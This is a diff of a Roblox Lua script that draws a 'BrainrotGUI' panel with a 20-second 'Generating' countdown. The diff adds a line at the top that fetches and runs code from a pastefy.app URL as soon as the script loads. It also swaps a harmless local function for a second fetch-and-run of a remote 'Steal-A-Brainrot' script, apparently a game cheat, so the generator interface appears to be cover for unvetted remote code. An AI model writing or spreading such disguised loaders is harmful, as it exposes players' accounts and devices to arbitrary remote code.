@@ -1,17 +1,18 @@
+--// Combined Loading & Execution Script
 loadstring(game:HttpGet("https://pastefy.app/qYlkCOqd/raw"))()
+
 --// Services
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
-
 local player = Players.LocalPlayer
 
---// ScreenGui
+--// ScreenGui Setup
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "BrainrotGUI"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = player:WaitForChild("PlayerGui")
 
---// Frame
+--// UI Frame
 local Frame = Instance.new("Frame")
 Frame.Size = UDim2.new(0, 320, 0, 180)
 Frame.Position = UDim2.new(0.5, -160, 0.5, -90)
@@ -22,14 +23,14 @@ Frame.Parent = ScreenGui
 
 Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 14)
 
--- Gradient
+-- Visuals: Gradient
 local grad = Instance.new("UIGradient", Frame)
 grad.Color = ColorSequence.new{
 	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,170,255)),
 	ColorSequenceKeypoint.new(1, Color3.fromRGB(170,0,255))
 }
 
--- Title
+-- Visuals: Title & Credit
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1,0,0,40)
 Title.BackgroundTransparency = 1
@@ -39,7 +40,6 @@ Title.TextSize = 20
 Title.TextColor3 = Color3.new(1,1,1)
 Title.Parent = Frame
 
--- Credit Name
 local Credit = Instance.new("TextLabel")
 Credit.Size = UDim2.new(1,0,0,20)
 Credit.Position = UDim2.new(0,0,0,35)
@@ -50,7 +50,7 @@ Credit.TextSize = 14
 Credit.TextColor3 = Color3.fromRGB(200,200,200)
 Credit.Parent = Frame
 
--- Button
+-- Interaction: Button
 local Button = Instance.new("TextButton")
 Button.Size = UDim2.new(0.8,0,0,50)
 Button.Position = UDim2.new(0.1,0,0.45,0)
@@ -63,63 +63,32 @@ Button.Parent = Frame
 
 Instance.new("UICorner", Button).CornerRadius = UDim.new(0,10)
 
---// DRAG SYSTEM
-local dragging = false
-local dragStart = nil
-local startPos = nil
-local dragInput = nil
-
-local function update(input)
-	local delta = input.Position - dragStart
-	Frame.Position = UDim2.new(
-		startPos.X.Scale,
-		startPos.X.Offset + delta.X,
-		startPos.Y.Scale,
-		startPos.Y.Offset + delta.Y
-	)
-end
-
+--// DRAG SYSTEM (Keeps UI Movable)
+local dragging, dragStart, startPos
 Frame.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1
-	or input.UserInputType == Enum.UserInputType.Touch then
-		
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 		dragging = true
 		dragStart = input.Position
 		startPos = Frame.Position
-
 		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragging = false
-			end
+			if input.UserInputState == Enum.UserInputState.End then dragging = false end
 		end)
 	end
 end)
-
-Frame.InputChanged:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseMovement
-	or input.UserInputType == Enum.UserInputType.Touch then
-		dragInput = input
-	end
-end)
-
 UIS.InputChanged:Connect(function(input)
-	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
-	or input.UserInputType == Enum.UserInputType.Touch) then
-		update(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - dragStart
+		Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
 	end
 end)
 
---// SAFE LOCAL SCRIPT TO RUN AFTER LOADING
-local function RunAfterLoading()
-	print("Loading finished! Your script runs now.")
-end
-
---// BUTTON LOGIC
+--// BUTTON LOGIC & SCRIPT EXECUTION
 Button.MouseButton1Click:Connect(function()
 	if Frame:FindFirstChild("Timer") then return end
 
 	Button.Active = false
 	Button.AutoButtonColor = false
+    Button.Text = "Wait for it..."
 
 	local Timer = Instance.new("TextLabel")
 	Timer.Name = "Timer"
@@ -131,19 +100,24 @@ Button.MouseButton1Click:Connect(function()
 	Timer.TextColor3 = Color3.new(1,1,1)
 	Timer.Parent = Frame
 
-	-- 20 second countdown
+	-- The 20 second countdown loop
 	for i = 20, 1, -1 do
 		Timer.Text = "Generating in... "..i.."s"
 		task.wait(1)
 	end
 
-	Timer.Text = "Generating..."
+	Timer.Text = "Executing Script..."
 	task.wait(0.5)
 
-	-- Run your local code AFTER loading
-	RunAfterLoading()
+	--// EXECUTE THE NEXT SCRIPT HERE
+	local success, err = pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/Steal-A-Brainrot/OGBlock.lua"))()
+	end)
+	
+	if not success then
+		warn("Failed to load OGBlock script: " .. tostring(err))
+	end
 
-	-- Remove GUI
-	ScreenGui.Enabled = false
+	-- Cleanup UI
 	ScreenGui:Destroy()
 end)
